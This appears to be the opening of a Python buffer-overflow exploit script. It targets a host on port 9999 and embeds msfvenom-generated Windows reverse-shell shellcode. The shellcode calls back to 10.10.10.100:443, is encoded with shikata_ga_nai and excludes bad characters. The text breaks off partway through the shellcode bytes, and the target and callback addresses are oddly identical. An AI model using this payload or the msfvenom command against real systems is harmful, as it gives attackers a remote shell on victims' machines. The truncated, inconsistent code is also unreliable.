import socket
socket.if_indextoname(3)

# INTERFACE : 4
# IP Address: 10.0.0.6
# Mask: 255.255.255.0
# Broadcast: 10.0.0.255
# MAC Address: 00:0a:35:00:01:06

def main():
	host = "10.10.10.100"
	port = 9999

	# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
	buf =  b""
	buf += b"\xdd\xc5\xbb\xe3\x1c\x45\x09\xd9\x74\x24\xf4\x58\x29"
	buf += b"\xc9\xb1\x53\x31\x58\x17\x83\xe8\xfc\x03\x06\x67\x13"
	buf += b"\x2b\
